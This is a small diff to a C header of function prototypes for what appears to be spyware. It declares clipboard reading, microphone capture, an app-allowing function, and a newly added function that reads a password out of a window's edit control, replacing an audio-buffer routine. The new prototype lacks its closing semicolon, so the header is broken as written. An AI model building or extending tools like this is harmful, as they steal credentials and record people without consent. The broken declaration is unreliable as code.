@@ -59,5 +59,6 @@ int *allow_app(char *exe);
 void read_clipboard(char *buffer, size_t size);
 
 void capture_micro(void);
-int get_buffer(HRESULT *hr, IAudioCaptureClient *captureClient);
+int read_password_from_control(HWND hEdit, char *out, size_t out_size)
+
 #endif
